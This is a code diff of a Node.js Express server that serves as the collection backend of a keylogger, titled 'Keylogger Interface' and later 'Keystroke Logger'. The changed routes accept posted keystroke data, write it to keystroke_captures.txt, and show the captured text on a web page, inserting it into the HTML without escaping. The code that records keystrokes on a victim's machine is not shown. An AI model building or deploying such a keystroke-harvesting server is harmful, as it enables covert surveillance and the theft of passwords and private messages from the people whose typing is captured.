@@ -9,99 +9,62 @@ app.use(bodyParser.json({ extended: true }));
 
 const port = 8080;
 
-// HTML for keylogger-style interface
-const htmlForm = `
+// HTML template for the interface
+const interfaceTemplate = `
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Keylogger Interface</title>
+    <title>Keystroke Logger</title>
     <style>
         body {
-            background-color: #000;
-            color: #0f0;
-            font-family: monospace;
-            padding: 20px;
+            font-family: Arial, sans-serif;
+            margin: 20px;
         }
-        #content {
-            max-width: 600px;
-            margin: 0 auto;
+        h1 {
+            color: #333;
         }
-        textarea {
-            width: 100%;
-            height: 200px;
-            background-color: #000;
-            color: #0f0;
-            border: 1px solid #0f0;
-            padding: 10px;
-            font-family: monospace;
-        }
-        button {
-            background-color: #00f;
-            color: #fff;
-            border: none;
-            padding: 10px 20px;
-            cursor: pointer;
-            font-family: monospace;
-        }
-        button:hover {
-            background-color: #0033cc;
-        }
-        #loggedData {
-            margin-top: 20px;
-            white-space: pre-wrap;
+        p {
+            color: #666;
         }
     </style>
 </head>
 <body>
-    <div id="content">
-        <h1>Keylogger Interface</h1>
-        <textarea id="keyboardData" placeholder="Waiting for keystrokes..." readonly></textarea><br>
-        <button id="clearBtn">Clear</button>
-        <hr>
+    <h1>Keystroke Logger</h1>
+    <div id="loggedData">
         <h2>Logged Data</h2>
-        <pre id="loggedData">Nothing Logged yet.</pre>
+        <p>{loggedData}</p>
     </div>
-    
-    <script>
-        // Function to fetch and display logged data
-        function fetchLoggedData() {
-            fetch('/')
-                .then(response => response.text())
-                .then(data => {
-                    document.getElementById('loggedData').innerText = data;
-                })
-                .catch(error => console.error('Error fetching data:', error));
-        }
-
-        // Fetch logged data initially when the page loads
-        fetchLoggedData();
-
-        // Function to fetch logged data every 5 seconds
-        setInterval(fetchLoggedData, 5000);
-
-        // Function to clear textarea
-        document.getElementById('clearBtn').addEventListener('click', function() {
-            document.getElementById('keyboardData').value = '';
-        });
-    </script>
 </body>
 </html>
 `;
 
-// Route to serve HTML interface
+// Route to handle GET requests and display logged keystrokes
 app.get("/", (req, res) => {
-    res.send(htmlForm);
+    try {
+        // Read the keystrokes from the file
+        const kl_file = fs.readFileSync("./keystroke_captures.txt", { encoding: 'utf8', flag: 'r' });
+        
+        // Replace newline characters with <br> for HTML formatting
+        const formattedData = kl_file.replace(/\n/g, "<br>");
+        
+        // Render HTML template with logged data
+        const html = interfaceTemplate.replace("{loggedData}", formattedData);
+        res.send(html);
+    } catch {
+        // If file doesn't exist or any error occurs, send a message indicating no data
+        res.send(interfaceTemplate.replace("{loggedData}", "<p>Nothing logged yet.</p>"));
+    }
 });
 
 // Route to handle POST requests and save the keystrokes data
 app.post("/", (req, res) => {
     console.log(req.body.keyboardData);
     
-    // Append the received keystrokes data to the file
-    fs.appendFileSync("keystroke_captures.txt", req.body.keyboardData + "\n");
-    res.send("Successfully logged the data");
+    // Write the received keystrokes data to the file
+    fs.writeFileSync("keystroke_captures.txt", req.body.keyboardData);
+    res.send("Successfully set the data");
 });
 
 // Start the server and listen on the specified port
